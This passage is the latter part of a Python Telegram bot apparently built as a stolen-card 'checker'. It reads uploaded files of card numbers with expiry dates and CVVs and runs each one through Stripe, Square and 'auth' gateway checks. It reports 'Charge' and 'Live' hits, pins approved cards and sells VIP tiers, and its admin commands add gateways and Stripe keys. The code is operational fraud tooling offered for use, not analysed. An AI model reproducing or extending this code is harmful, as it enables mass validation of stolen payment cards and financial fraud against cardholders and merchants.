                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
            except: pass
            await asyncio.sleep(1)
        await context.bot.send_message(chat_id, premium_emoji("🚀 Stripe complete."), parse_mode="HTML")
    except asyncio.CancelledError:
        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
    except Exception as e:
        await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")

async def process_square_file(file_path, chat_id, context):
    user_id = chat_id
    stop_users[user_id] = False
    try:
        approved = live = declined = 0
        card_counter = 0
        panel_msg = await context.bot.send_message(chat_id, premium_emoji("🔄 Square Checking..."), parse_mode="HTML")
        loop = asyncio.get_event_loop()
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        for line in lines:
            if stop_users.get(user_id):
                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                return
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if not match: continue
            card_full = match[0]
            card_counter += 1
            result = await loop.run_in_executor(None, check_square_sync, card_full)
            if "CHARGE" in result:
                approved += 1
                text = await format_square_response(card_full, result, 0, user_id, "Mass")
                msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                try:
                    await msg.pin(disable_notification=True)
                except:
                    pass
            elif "LIVE" in result:
                live += 1
                text = await format_square_response(card_full, result, 0, user_id, "Mass")
                await context.bot.send_message(chat_id, text, parse_mode="HTML")
            else:
                declined += 1
            panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
         ▬▬ [ MASS SQUARE ] ▬▬
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
✅ Charge: <code>{approved}</code>
✅ Live: <code>{live}</code>
❌ Declined: <code>{declined}</code>
📊 Total: <code>{approved + live + declined}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 Card #{card_counter}: <code>{card_full}</code>
📝 Result: <code>{result}</code>"""
            try:
                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
            except: pass
            await asyncio.sleep(2)
        await context.bot.send_message(chat_id, premium_emoji("🚀 Square complete."), parse_mode="HTML")
    except asyncio.CancelledError:
        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
    except Exception as e:
        await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")

async def process_auth_file(file_path, chat_id, context):
    user_id = chat_id
    stop_users[user_id] = False
    try:
        approved = live = declined = 0
        card_counter = 0
        panel_msg = await context.bot.send_message(chat_id, premium_emoji("🛡 Auth Checking..."), parse_mode="HTML")
        loop = asyncio.get_event_loop()
        with open(file_path, 'r', encoding='utf-8') as f:
            lines = f.readlines()
        for line in lines:
            if stop_users.get(user_id):
                await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
                return
            match = re.findall(r'\d{12,16}\|\d{2}\|\d{2,4}\|\d{3,4}', line)
            if not match: continue
            card_full = match[0]
            card_counter += 1
            result_dict = await loop.run_in_executor(None, check_auth_sync, card_full)
            status = result_dict.get('status', 'declined')
            if status == "approved":
                approved += 1
                text = await format_auth_response(card_full, result_dict, 0, user_id, "Mass")
                msg = await context.bot.send_message(chat_id, text, parse_mode="HTML")
                try:
                    await msg.pin(disable_notification=True)
                except:
                    pass
            elif status == "live":
                live += 1
                text = await format_auth_response(card_full, result_dict, 0, user_id, "Mass")
                await context.bot.send_message(chat_id, text, parse_mode="HTML")
            else:
                declined += 1
            message = result_dict.get('message', '')
            panel = f"""┏━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┓
         ▬▬ [ MASS AUTH ] ▬▬
┗━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━┛
✅ Approved: <code>{approved}</code>
✅ Live: <code>{live}</code>
❌ Declined: <code>{declined}</code>
📊 Total: <code>{approved + live + declined}</code>
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
💳 Card #{card_counter}: <code>{card_full}</code>
📝 Result: <code>{message[:80]}</code>"""
            try:
                await panel_msg.edit_text(premium_emoji(panel), parse_mode="HTML")
            except: pass
            await asyncio.sleep(1)
        await context.bot.send_message(chat_id, premium_emoji("🚀 Auth complete."), parse_mode="HTML")
    except asyncio.CancelledError:
        await context.bot.send_message(chat_id, premium_emoji("🛑 Stopped."), parse_mode="HTML")
    except Exception as e:
        await context.bot.send_message(chat_id, premium_emoji(f"❌ Error: {e}"), parse_mode="HTML")

async def error_handler(update, context):
    pass

def main():
    app = Application.builder().token(TOKEN).build()
    app.add_error_handler(error_handler)
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("cmds", cmds))
    app.add_handler(CommandHandler("pp", pp))
    app.add_handler(CommandHandler("auth", auth_check))
    app.add_handler(CommandHandler("stop", stop))
    app.add_handler(CommandHandler("code", code_command))
    app.add_handler(CommandHandler("wafa", wafa_command))
    app.add_handler(CommandHandler("show_users", show_users))
    app.add_handler(CommandHandler("show_gateways", show_gateways))
    app.add_handler(CommandHandler("ban_user", ban_user))
    app.add_handler(CommandHandler("unban_user", unban_user))
    app.add_handler(CommandHandler("try", try_reply))
    app.add_handler(CommandHandler("SENT", sent_broadcast))
    app.add_handler(CommandHandler("add", add_gateway))
    app.add_handler(CommandHandler("rmadd", remove_gateway))
    app.add_handler(CommandHandler("prm", add_prm))
    app.add_handler(CommandHandler("rmprm", remove_prm))
    app.add_handler(CommandHandler("addkey", add_stripe_key))
    app.add_handler(CommandHandler("rmkey", remove_stripe_key))
    app.add_handler(CommandHandler("st", st_check))
    app.add_handler(CommandHandler("sq", sq_check))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file_panel))
    app.add_handler(CallbackQueryHandler(free_cmds_callback, pattern="^free_cmds$"))
    app.add_handler(CallbackQueryHandler(vip_cmds_callback, pattern="^vip_cmds$"))
    app.add_handler(CallbackQueryHandler(admin_cmds_callback, pattern="^admin_cmds$"))
    app.add_handler(CallbackQueryHandler(check_panel_callback, pattern="^check_panel$"))
    app.add_handler(CallbackQueryHandler(check_paypal_callback, pattern="^check_paypal$"))
    app.add_handler(CallbackQueryHandler(check_stripe_callback, pattern="^check_stripe$"))
    app.add_handler(CallbackQueryHandler(check_square_callback, pattern="^check_square$"))
    app.add_handler(CallbackQueryHandler(check_auth_callback, pattern="^check_auth$"))
    app.add_handler(CallbackQueryHandler(stats_panel_callback, pattern="^stats_panel$"))
    app.add_handler(CallbackQueryHandler(back_to_start_callback, pattern="^back_to_start$"))
    app.add_handler(CallbackQueryHandler(gate_info_callback, pattern="^gate_info_"))
    app.add_handler(CallbackQueryHandler(gate_remove_callback, pattern="^gate_remove_"))
    app.add_handler(CallbackQueryHandler(back_to_gateways_callback, pattern="^back_to_gateways$"))
    app.add_handler(CallbackQueryHandler(close_gateways_callback, pattern="^close_gateways$"))
    app.add_handler(CallbackQueryHandler(gateway_callback, pattern="^gateway_"))
    app.run_polling()

if __name__ == "__main__":
    main()
